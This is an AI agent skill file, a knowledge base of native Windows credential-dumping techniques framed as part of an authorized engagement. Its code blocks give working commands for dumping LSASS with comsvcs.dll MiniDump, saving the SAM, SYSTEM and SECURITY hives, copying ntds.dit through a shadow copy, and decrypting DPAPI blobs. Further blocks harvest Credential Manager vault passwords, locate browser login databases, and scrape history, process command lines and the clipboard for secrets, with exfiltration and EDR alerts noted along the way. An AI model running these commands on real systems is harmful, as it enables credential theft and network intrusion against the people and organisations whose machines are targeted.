---
name: credential-review
description: >-
  Credential Access (native) — Knowledge Base — Credential dumping without an in-memory
  credential-dumping tool. LOLBins (`comsvcs.dll` MiniDump, `reg save`), DPAPI via .NET, native store
  reads. Offline hash extraction is the one place Tier-1 is the honest path. Triggers: credential
  access, dump creds, in-memory-credential-dumping-tool equivalent, LSASS dump, comsvcs MiniDump,
  DPAPI, SAM dump, reg save SAM, browser creds, credential manager, NTDS.dit, vssadmin shadow copy,
  stored passwords.
license: MIT
metadata:
  user-invocable: "false"
  origin: agents/credential-review/credential-review.md (verbatim; frontmatter prefixado)
  progressive-disclosure: index-first
---
# Credential Access (native) — Knowledge Base
_Last updated: 2026-06-22_

Credential dumping without an in-memory credential-dumping tool. LOLBins (`comsvcs.dll` MiniDump, `reg save`), DPAPI via .NET, native store reads. Offline hash extraction is the one place Tier-1 is the honest path.

## Index
| # | Technique | When | Tier | Tags |
|---|-----------|------|------|------|
| T1 | LSASS MiniDump via comsvcs.dll | Admin/SeDebug on the host; want in-memory creds | 0-native | windows-local, cred-access, lolbin, requires-admin |
| T2 | SAM/SYSTEM hive copy (local hashes) | Admin or SeBackup; want local account hashes | 0-native | windows-local, cred-access, lolbin |
| T3 | DPAPI secret decryption (browser/creds) | User context with access to DPAPI-protected blobs | 1-python | windows-local, cred-access, dpapi, tier1-python |
| T4 | Offline hash extraction from hives | You exfiltrated SAM/SYSTEM (T2) | 1-python | cred-access, tier1-python |
| T5 | Credential Manager / cmdkey harvest | Any user context | 0-native | windows-local, cred-access |
| T6 | Browser saved-credential store | User profile accessible | 0-native | windows-local, cred-access |
| T7 | Process memory / clipboard / history scrape | Looking for transient secrets | 0-native | windows-local, cred-access |

## Techniques

### T1: LSASS MiniDump via comsvcs.dll
Tags: windows-local, cred-access, lolbin, requires-admin
When: You have admin or `SeDebugPrivilege` and want credentials cached in LSASS.
Why: `comsvcs.dll` (signed, on every box) exports `MiniDump`, which dumps LSASS to disk — exactly what an in-memory credential-dumping tool's `sekurlsa` reads, without dropping such a tool. You then parse the dump offline.
Tier: 0-native
Steps: 1. Get LSASS PID 2. `rundll32 comsvcs.dll MiniDump <pid> <out> full` 3. Parse offline (Tier-1) or hand to user
Payload:
```powershell
$pid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid C:\Temp\l.dmp full
```
Signal: a multi-MB `.dmp` written. | Pitfall: modern Defender/EDR flags `comsvcs MiniDump` on LSASS specifically — the engagement is authorized so the dump is fine, but expect an alert (note it for the blue-team report). Parsing the dump for creds is a separate offline step (offline credential-parser, Tier-1 Python — escalation: dump-format + DPAPI/crypto parsing is impractical in PowerShell) or a `@user`/offline task.
Source: distilled native LSASS dump — 2026-06-22

### T2: SAM/SYSTEM hive copy (local hashes)
Tags: windows-local, cred-access, lolbin
When: Admin, or `SeBackupPrivilege` (see `privilege-review/windows.md#T6`).
Why: Local account NTLM hashes live in the SAM hive, keyed by the SYSTEM hive's bootkey. `reg save` copies both natively (honoring backup privilege); `vssadmin`/`esentutl` handle locked files for `ntds.dit` on a DC.
Tier: 0-native
Steps: 1. `reg save` SAM + SYSTEM (+ SECURITY for cached domain creds) 2. Exfil 3. Extract offline (T4)
Payload:
```cmd
reg save HKLM\SAM      C:\Temp\sam.save
reg save HKLM\SYSTEM   C:\Temp\system.save
reg save HKLM\SECURITY C:\Temp\security.save
```
For `ntds.dit` on a DC (locked): use a VSS snapshot —
```cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\NTDS\ntds.dit C:\Temp\
```
Signal: hive files written and readable. | Pitfall: never claim hashes you haven't extracted — the files alone aren't creds (impact-first bar). Extraction = T4.
Source: distilled native hive dump — 2026-06-22

### T3: DPAPI secret decryption (browser/creds)
Tags: windows-local, cred-access, dpapi, tier1-python
When: In a user's context (or with their masterkey) and want DPAPI-protected blobs (Chrome cookies/passwords, Credential Manager, saved Wi-Fi).
Why: As the owning user, `[System.Security.Cryptography.ProtectedData]::Unprotect` decrypts user-DPAPI blobs natively — no in-memory credential-dumping tool's `dpapi::`. For other users' blobs you need their masterkey (cross-user → Tier-1).
Tier: 1-python
Escalation: same-user DPAPI is native (`ProtectedData.Unprotect`); cross-user masterkey decryption and Chrome's AES-GCM-wrapped key chain need crypto + SQLite parsing PowerShell handles poorly — a stdlib Python step is cleaner. (When it's *your own* user's data, drop to Tier 0.)
Steps: 1. Locate the blob (Login Data SQLite, Vault, masterkey) 2. Same-user → `ProtectedData.Unprotect` (Tier 0) 3. Cross-user → Tier-1 with the masterkey
Payload (Tier-0 same-user example):
```powershell
Add-Type -AssemblyName System.Security
$blob = [byte[]](Get-Content blob.bin -Encoding Byte)
[Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($blob,$null,'CurrentUser'))
```
Signal: plaintext secret recovered. | Pitfall: Chrome v80+ wraps the AES key with DPAPI then encrypts cookies with AES-GCM — you need both steps; the SQLite+GCM part is the Tier-1 escalation.
Source: distilled native/native-normalized DPAPI — 2026-06-22

### T4: Offline hash extraction from hives
Tags: cred-access, tier1-python
When: You have SAM/SYSTEM (T2) and need the actual NTLM hashes.
Why: Deriving the bootkey from SYSTEM and decrypting the SAM-stored hashes is AES/RC4/MD5 crypto chaining — doable in PowerShell but painful and error-prone. A stdlib Python script (no remote-protocol exploitation toolkit) is the honest minimal path.
Tier: 1-python
Escalation: bootkey derivation + SAM hash decryption is multi-step crypto that PowerShell expresses badly; a self-contained stdlib Python script (an offline hash-extractor, no third-party deps) does it.
Steps: 1. Parse SYSTEM for the bootkey 2. Decrypt SAM hashes 3. Output `user:rid:lm:nt:::`
Payload: see `agents/forge/forge.md` "Hash/crypto helper" — a stdlib `samdump.py` (registry hive parse + AES/RC4 + MD4).
Signal: NTLM hashes for local accounts → hash-based authentication (`host-to-host-access.md`) or offline crack. | Pitfall: confirm Python on the box (`@user` task if absent). Heavy *cracking* is the user's offline hardware, not this step.
Source: distilled native-normalized hash extraction — 2026-06-22

### T5: Credential Manager / cmdkey harvest
Tags: windows-local, cred-access
When: Any user context.
Why: The Windows Credential Manager holds saved domain/web/RDP creds usable via `runas /savecred` even without recovering plaintext. Native `cmdkey` + Vault read.
Tier: 0-native
Steps: 1. `cmdkey /list` 2. Read the Vault via the Vault COM API or `Get-StoredCredential` if available 3. Reuse via runas
Payload:
```cmd
cmdkey /list
```
```powershell
# Vault enumeration (no plaintext, but reveals what's stored):
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword(); $_ }
```
Signal: stored creds for a higher-priv account → reuse (`privilege-review/windows.md#T9`). | Pitfall: the PasswordVault API only returns the *current user's* web-credential vault, not generic cmdkey creds — use both surfaces.
Source: distilled native cred harvest — 2026-06-22

### T6: Browser saved-credential store
Tags: windows-local, cred-access
When: A user profile is accessible.
Why: Browsers store creds/cookies in SQLite under the profile; the encryption is DPAPI-rooted (T3). Locating + copying the stores is native; decryption is T3.
Tier: 0-native
Steps: 1. Locate `Login Data` / `Cookies` per browser 2. Copy out (file is locked while browser runs — copy a VSS/`reg save`-style snapshot or when closed) 3. Decrypt (T3)
Payload:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data\*\Login Data" -ErrorAction SilentlyContinue
Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*\logins.json" -ErrorAction SilentlyContinue
```
Signal: a `Login Data` DB present. | Pitfall: file lock while the browser runs — copy it elsewhere first; decryption is the Tier-1 T3 step, don't claim plaintext you haven't decrypted.
Source: distilled native browser cred — 2026-06-22

### T7: Process memory / clipboard / history scrape
Tags: windows-local, cred-access
When: Hunting transient secrets without dumping LSASS.
Why: PowerShell history, the clipboard, and command-line args of running processes (`Win32_Process.CommandLine`) frequently contain passwords passed inline. All native, low-noise.
Tier: 0-native
Steps: 1. Read PS history files 2. Scrape process command lines 3. Check clipboard
Payload:
```powershell
Get-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue | Select-String 'pass|pwd|secret|-p '
Get-CimInstance Win32_Process | ? CommandLine -match 'pass|pwd|/p:|--password' | Select Name,CommandLine
Get-Clipboard
```
Signal: a credential in a command line or history. | Pitfall: process command-line visibility may need elevation for other users' processes — note the context.
Source: distilled native transient-secret scrape — 2026-06-22
